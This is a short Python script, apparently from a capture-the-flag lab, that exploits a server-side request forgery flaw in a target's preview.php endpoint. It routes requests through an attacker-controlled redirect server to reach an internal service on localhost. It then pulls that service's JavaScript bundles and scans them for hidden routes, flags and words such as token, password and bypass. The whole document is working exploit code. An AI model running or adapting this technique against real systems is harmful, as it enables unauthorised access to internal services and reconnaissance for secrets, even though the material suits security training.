import requests, urllib.parse, re

attacker = 'http://192.168.223.117:8000'
base = 'http://10.82.159.192/preview.php?url='

def fetch_redirect(path, port=10000):
    target = f'http://127.0.0.1:{port}{path}'
    redir = attacker + '/redirect?to=' + urllib.parse.quote(target, safe='')
    r = requests.get(base + urllib.parse.quote(redir, safe=''), timeout=10)
    return r.text

# Get the JS chunks to find actual routes
chunks = [
    '/_next/static/chunks/fd9d1056-ffbd49fae2ee76ea.js',
    '/_next/static/chunks/472-22e55b21ed910619.js',
    '/_next/static/chunks/main-app-321a014647b5278e.js',
    '/_next/static/chunks/webpack-8fc0c21e0210cbd2.js',
]

for chunk in chunks:
    body = fetch_redirect(chunk)
    print(f'=== {chunk} ({len(body)}b) ===')
    # Find route strings like "/admin", "/api/...", "/dashboard"
    routes = re.findall(r'["\`](/[a-zA-Z0-9/_-]{2,50})["\`]', body)
    routes = [r for r in routes if not r.startswith('/_next') and not r.startswith('/static')]
    if routes:
        print('Routes found:', sorted(set(routes)))
    # Find any THM flags
    flags = re.findall(r'THM\{[^}]+\}', body)
    if flags:
        print('FLAGS:', flags)
    # Find interesting keywords
    keywords = re.findall(r'["\`]([a-zA-Z][a-zA-Z0-9_-]{3,30})["\`]', body)
    interesting = [k for k in keywords if k.lower() in 
                   ['admin', 'flag', 'secret', 'token', 'auth', 'login', 'dashboard',
                    'password', 'key', 'middleware', 'bypass', 'internal', 'api']]
    if interesting:
        print('Keywords:', sorted(set(interesting)))
    print()
